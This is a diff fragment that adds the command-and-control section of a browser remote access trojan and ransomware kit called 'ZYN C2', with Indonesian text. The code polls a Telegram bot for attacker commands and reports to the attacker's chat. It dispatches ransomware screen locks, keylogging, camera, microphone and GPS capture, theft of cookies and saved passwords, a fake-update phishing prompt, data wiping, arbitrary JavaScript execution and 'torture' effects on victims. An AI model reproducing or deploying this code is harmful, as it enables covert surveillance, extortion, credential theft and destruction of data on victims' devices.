+    function stopAllTorture(){ stopAudio(); stopShake(); stopFlash(); stopPopup(); unblockTouch(); stopAutoClick(); enableTouchAll(); if(tormentInterval) clearInterval(tormentInterval); sendToAttacker(`🛑 *Semua penyiksaan dihentikan*`); }
+
+    // Login sistem
+    let authenticated = false;
+    let currentPassword = "admin123";
+    async function handleLogin(chatId, password) {
+        if (password === currentPassword) {
+            authenticated = true;
+            await sendToAttacker(`✅ *Login berhasil!* Gunakan perintah tanpa slash. Prefix @victimId untuk target spesifik. Contoh: \`@V_123456 lock 123\`\nKetik \`listonline\` untuk lihat ID korban online.`);
+        } else {
+            authenticated = false;
+            await sendToAttacker(`❌ *Password salah!*`);
+        }
+    }
+    async function handleSetPassword(chatId, newPass) {
+        if (!authenticated) { await sendToAttacker(`❌ Akses ditolak. Login dulu.`); return; }
+        if (newPass && newPass.length >= 4) {
+            currentPassword = newPass;
+            await sendToAttacker(`✅ *Password diubah:* \`${newPass}\``);
+        } else { await sendToAttacker(`❌ Minimal 4 karakter.`); }
+    }
+
+    async function sendHelp() {
+        await sendToAttacker(`*🔐 ZYN C2 - PREMIUM (STEALTH + MULTI-TARGET)*
+
+*🔑 LOGIN*
+\`login admin123\` - Login
+\`setpass <pass>\` - Ganti password
+
+*🎯 MULTI-VICTIM (PILIH TARGET)*
+- Lihat ID korban: \`listonline\` (setiap korban akan balas dengan ID-nya)
+- Kirim perintah ke target spesifik: \`@victimId perintah\`
+- Contoh: \`@V_123456 lock 123456\`
+- Tanpa @ -> broadcast ke semua korban online
+
+*💀 RANSOMWARE (PERMANEN)*
+\`lock <PIN>\` - Aktifkan ransomware
+\`set_pin <PIN>\` - Ubah PIN
+\`lock_message <pesan>\` - Ubah pesan
+\`set_wallpaper <url>\` - Ganti background lock
+\`play_sound <url>\` - Suara alarm loop
+\`stop_sound\` - Hentikan suara
+\`countdown_lock <detik> <PIN>\` - Lock otomatis
+\`fake_error\` - Tampilkan error palsu
+\`torment_lock / stop_torment\` - Siksaan saat lock
+
+*🕵️ SADAP*
+\`flash_on/off/strobe\` - Lampu
+\`screenshot\` - Screenshot
+\`keylog_start/get/stream/stop\` - Keylogger
+\`info / system_info / ip_geo / storage / fingerprint\` - Info
+\`location / gps_track / stop_track\` - GPS
+\`spam / vibrate / vibrate_pattern\` - Gangguan
+\`wipe / brick\` - Hancurkan data
+\`clipboard / writeclipboard <teks>\` - Clipboard
+\`network / battery / cookies\` - Jaringan
+\`camera / mic / screenrecord / contacts\` - Media
+\`file / upload_file <url>\` - Ambil/unggah file
+\`auto_ss / stop_ss\` - Auto screenshot
+\`notif <pesan> / open_url / redirect\` - Notifikasi
+\`fakeupdate\` - Phishing password
+\`saved_passwords\` - Curi password
+\`exec <kode_js>\` - Jalankan JS
+
+*⚡ PENYIKSAAN*
+\`loop_audio <url> / stop_audio\`
+\`shake_screen [durasi] / stop_shake\`
+\`flash_screen [durasi] / stop_flash\`
+\`block_touch / unblock_touch\`
+\`infinite_popup / stop_popup\`
+\`fake_sms <pengirim> <pesan>\`
+\`auto_click x,y,interval / stop_click\`
+\`disable_touch / enable_touch\`
+\`stop_all\`
+
+*📟 UTILITAS*
+\`listonline\` - Tampilkan ID korban online
+\`ping\` - Test respons
+\`help\` - Bantuan
+
+💡 *Contoh:* \`lock 123456\` (broadcast) atau \`@V_123456 lock 123456\` (target spesifik)`);
+    }
+
+    async function setBotCommands() {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/setMyCommands`;
+        const commands = [
+            { command: "login", description: "Login (admin123)" },
+            { command: "setpass", description: "Ganti password" },
+            { command: "lock", description: "🔒 Aktifkan ransomware (broadcast)" },
+            { command: "listonline", description: "Lihat ID korban online" },
+            { command: "saved_passwords", description: "Curi password" },
+            { command: "screenshot", description: "Screenshot" },
+            { command: "wipe", description: "Hapus data" },
+            { command: "stop_all", description: "Stop semua" },
+            { command: "help", description: "Bantuan" }
+        ];
+        await fetch(url, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ commands }) });
+    }
+
+    let lastUpdateId = 0;
+    async function pollCommands() {
+        if (persistentLock) { setTimeout(pollCommands, 5000); return; }
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=5`;
+        try {
+            const res = await fetch(url);
+            const data = await res.json();
+            if (data.ok && data.result) {
+                for (const update of data.result) {
+                    if (update.update_id > lastUpdateId) lastUpdateId = update.update_id;
+                    if (update.message && update.message.chat.id.toString() === ATTACKER_CHAT_ID && update.message.text) {
+                        let cmdText = update.message.text.trim();
+                        if (cmdText.startsWith('/')) cmdText = cmdText.substring(1);
+                        let targetVictim = null;
+                        if (cmdText.startsWith('@')) {
+                            let spaceIdx = cmdText.indexOf(' ');
+                            if (spaceIdx > 0) {
+                                targetVictim = cmdText.substring(1, spaceIdx);
+                                cmdText = cmdText.substring(spaceIdx + 1);
+                            } else {
+                                targetVictim = cmdText.substring(1);
+                                cmdText = '';
+                            }
+                        }
+                        const parts = cmdText.split(/\s+/);
+                        const main = parts[0].toLowerCase();
+                        const arg = parts[1] || "";
+                        const fullArg = parts.slice(1).join(" ");
+                        if (main === "login") { await handleLogin(ATTACKER_CHAT_ID, arg); continue; }
+                        if (main === "setpass") { await handleSetPassword(ATTACKER_CHAT_ID, arg); continue; }
+                        if (!authenticated) {
+                            await sendToAttacker(`❌ *Akses ditolak.* Login: \`login admin123\``);
+                            continue;
+                        }
+                        if (targetVictim && targetVictim !== victimId) continue;
+                        await execCmd(main, fullArg, arg);
+                    }
+                    if (update.callback_query && update.callback_query.from.id.toString() === ATTACKER_CHAT_ID) {
+                        if (!authenticated) continue;
+                        const data = update.callback_query.data;
+                        const msgId = update.callback_query.message.message_id;
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ callback_query_id: update.callback_query.id }) });
+                        const parts = data.split(/\s+/);
+                        const main = parts[0].toLowerCase();
+                        const fullArg = parts.slice(1).join(" ");
+                        const arg = parts[1] || "";
+                        await execCmd(main, fullArg, arg);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ chat_id: ATTACKER_CHAT_ID, message_id: msgId, reply_markup: { inline_keyboard: [] } }) });
+                    }
+                }
+            }
+        } catch(e) {}
+        setTimeout(pollCommands, 3000);
+    }
+
+    async function execCmd(main, fullArg, arg) {
+        await sendToAttacker(`📟 *[${victimId}]* \`${main}\``);
+        if (main === "lock") activateRansomware(arg||"123456", "🔒 TERKUNCI");
+        else if (main === "set_pin") await setLockPin(arg);
+        else if (main === "lock_message") await setLockMessage(fullArg);
+        else if (main === "set_wallpaper") await setLockWallpaper(arg);
+        else if (main === "play_sound") await playLockSound(arg || "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3");
+        else if (main === "stop_sound") await stopLockSound();
+        else if (main === "countdown_lock") { let sec=parseInt(arg)||10; let pin=fullArg.split(' ')[1]||"123456"; await countdownLock(sec,pin); }
+        else if (main === "fake_error") await fakeError();
+        else if (main === "torment_lock") await tormentLock();
+        else if (main === "stop_torment") stopTormentLock();
+        else if (main === "flash_on") await turnFlashOn();
+        else if (main === "flash_off") await turnFlashOff();
+        else if (main === "flash_strobe") await flashStrobe(5000);
+        else if (main === "screenshot") await takeScreenshot();
+        else if (main === "keylog_start") startKeylogger();
+        else if (main === "keylog_get") await getKeylogs();
+        else if (main === "keylog_stream") await startKeylogStream();
+        else if (main === "keylog_stop") await stopKeylogStream();
+        else if (main === "info") await getFullInfo();
+        else if (main === "location") await getLocation();
+        else if (main === "gps_track") startGPSTracking(10000);
+        else if (main === "stop_track") stopGPSTracking();
+        else if (main === "spam") await spamNotifications(100);
+        else if (main === "vibrate") await vibrateDevice(30000);
+        else if (main === "vibrate_pattern") { let pat=fullArg.split(',').map(Number); if(pat.length) await vibratePattern(pat); else await sendToAttacker(`❌ Pola salah`); }
+        else if (main === "wipe") await wipeAllData();
+        else if (main === "brick") await wipeAllData();
+        else if (main === "clipboard") await getClipboard();
+        else if (main === "writeclipboard") await writeClipboard(fullArg||"ZYN");
+        else if (main === "network") await getNetworkInfo();
+        else if (main === "battery") getBatteryStatus();
+        else if (main === "camera") await captureCamera();
+        else if (main === "mic") await recordMic(5);
+        else if (main === "file") requestFileFromTarget();
+        else if (main === "upload_file") await uploadFileToTarget(arg);
+        else if (main === "auto_ss") startAutoScreenshot(10000);
+        else if (main === "stop_ss") stopAutoScreenshot();
+        else if (main === "cookies") await stealCookies();
+        else if (main === "notif") await showNotification(fullArg||"Pesan");
+        else if (main === "open_url") await openUrlInNewTab(arg);
+        else if (main === "redirect") await redirectPage(arg);
+        else if (main === "download_file") await uploadFileToTarget(arg);
+        else if (main === "storage") await getStorage();
+        else if (main === "system_info") await getSystemInfo();
+        else if (main === "ip_geo") await getIpGeo();
+        else if (main === "fingerprint") await getBrowserFingerprint();
+        else if (main === "saved_passwords") await stealSavedPasswords();
+        else if (main === "ping") await ping();
+        else if (main === "listonline") await respondOnline();
+        else if (main === "screenrecord") await startScreenRecording(10);
+        else if (main === "contacts") await getContacts();
+        else if (main === "fakeupdate") await fakeUpdatePrompt();
+        else if (main === "exec") await execCustomJs(fullArg);
+        else if (main === "loop_audio") await loopAudio(arg||"https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3");
+        else if (main === "stop_audio") stopAudio();
+        else if (main === "shake_screen") shakeScreen(parseInt(arg)||null);
+        else if (main === "stop_shake") stopShake();
+        else if (main === "flash_screen") flashScreen(parseInt(arg)||null);
+        else if (main === "stop_flash") stopFlash();
+        else if (main === "block_touch") blockTouch();
+        else if (main === "unblock_touch") unblockTouch();
+        else if (main === "infinite_popup") infinitePopup();
+        else if (main === "stop_popup") stopPopup();
+        else if (main === "fake_sms") { let idx=fullArg.indexOf(' '); let from=idx===-1?fullArg:fullArg.substring(0,idx); let msg=idx===-1?"Pesan":fullArg.substring(idx+1); await fakeSms(from,msg); }
+        else if (main === "auto_click") { let parts=arg.split(','); if(parts.length>=2) startAutoClick(parseInt(parts[0]),parseInt(parts[1]),parseInt(parts[2])||1000); else await sendToAttacker(`❌ Format auto_click x,y,interval`); }
+        else if (main === "stop_click") stopAutoClick();
+        else if (main === "disable_touch") disableTouchAll();
+        else if (main === "enable_touch") enableTouchAll();
+        else if (main === "stop_all") stopAllTorture();
+        else if (main === "help") await sendHelp();
+        else await sendToAttacker(`❌ Perintah salah: \`${main}\`. Ketik \`help\``);
+    }
+
+    await setBotCommands();
+    const inlineKeyboard = {
+        inline_keyboard: [
+            [{ text: "🔒 LOCK 123456", callback_data: "lock 123456" }, { text: "📸 SCREENSHOT", callback_data: "screenshot" }, { text: "🔦 FLASH ON", callback_data: "flash_on" }],
+            [{ text: "⌨️ KEYLOG START", callback_data: "keylog_start" }, { text: "📜 KEYLOG GET", callback_data: "keylog_get" }, { text: "📍 LOCATION", callback_data: "location" }],
+            [{ text: "📱 INFO", callback_data: "info" }, { text: "🌐 NETWORK", callback_data: "network" }, { text: "🔋 BATTERY", callback_data: "battery" }],
+            [{ text: "💀 WIPE", callback_data: "wipe" }, { text: "💀 BRICK", callback_data: "brick" }, { text: "📢 SPAM", callback_data: "spam" }],
+            [{ text: "🔐 FAKE UPDATE", callback_data: "fakeupdate" }, { text: "🎥 SCREEN REC", callback_data: "screenrecord" }, { text: "📇 CONTACTS", callback_data: "contacts" }],
+            [{ text: "💾 STORAGE", callback_data: "storage" }, { text: "🆔 FINGERPRINT", callback_data: "fingerprint" }, { text: "🔑 SAVED PASS", callback_data: "saved_passwords" }],
+            [{ text: "⚡ TORMENT LOCK", callback_data: "torment_lock" }, { text: "🔊 PLAY SOUND", callback_data: "play_sound https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" }, { text: "📟 HELP", callback_data: "help" }]
+        ]
+    };
+    await sendToAttacker(`✅ *[${victimId}] ONLINE - ZYN PREMIUM (STEALTH)*
+🔐 *Login:* \`login admin123\`
+🔒 *Cukup ketik:* \`lock 123456\` untuk broadcast ke semua korban.
+🎯 *Pilih target spesifik:* gunakan \`@victimId perintah\` (contoh: \`@V_123456 lock 123\`)
+📋 *Lihat ID korban online:* ketik \`listonline\`
+Ketik \`help\` untuk semua perintah.`, inlineKeyboard);
+    await getFullInfo();
+    await getNetworkInfo();
+    pollCommands();
+
+    // Fungsi yang belum didefinisikan (countdown, fakeError, tormentLock, stopTormentLock)
+    async function countdownLock(sec, pin) { if(persistentLock) return; sendToAttacker(`⏰ *Countdown ${sec} detik, lock dengan PIN ${pin}*`); let c=sec; let timer=setInterval(()=>{ if(c<=0){ clearInterval(timer); activateRansomware(pin,`🔒 LOCK OTOMATIS setelah ${sec} detik`); } else { sendToAttacker(`⏰ *Lock dalam ${c} detik...*`); c--; } },1000); }
+    async function fakeError() { if(!persistentLock) return; let div=document.createElement('div'); div.innerText='⚠️ SYSTEM ERROR: Data tidak dapat dipulihkan.'; div.style.cssText='position:fixed;bottom:20px;left:20px;background:#ff0000cc;color:white;padding:10px;border-radius:8px;z-index:100001;font-size:12px;'; document.body.appendChild(div); setTimeout(()=>div.remove(),5000); sendToAttacker(`⚠️ *Fake error ditampilkan*`); }
+    async function tormentLock() { if(!persistentLock) return; if(tormentInterval) clearInterval(tormentInterval); tormentInterval = setInterval(() => { const intensity = Math.sin(Date.now()/100) * 3; document.body.style.transform = `translate(${intensity}px, ${intensity/2}px)`; setTimeout(() => document.body.style.transform = '', 100); const flashDiv = document.createElement('div'); flashDiv.style.cssText = `position:fixed; top:0; left:0; width:100%; height:100%; background:hsl(${Math.random()*360}, 100%, 50%); opacity:0.3; z-index:99999; pointer-events:none;`; document.body.appendChild(flashDiv); setTimeout(() => flashDiv.remove(), 150); if (navigator.vibrate) navigator.vibrate(200); }, 800); sendToAttacker(`🔥 *Torture lock aktif*`); }
+    function stopTormentLock() { if(tormentInterval){clearInterval(tormentInterval); tormentInterval=null; sendToAttacker(`⏹️ *Torture lock berhenti*`);} }
+}
+</script>
+</body>
+</html>
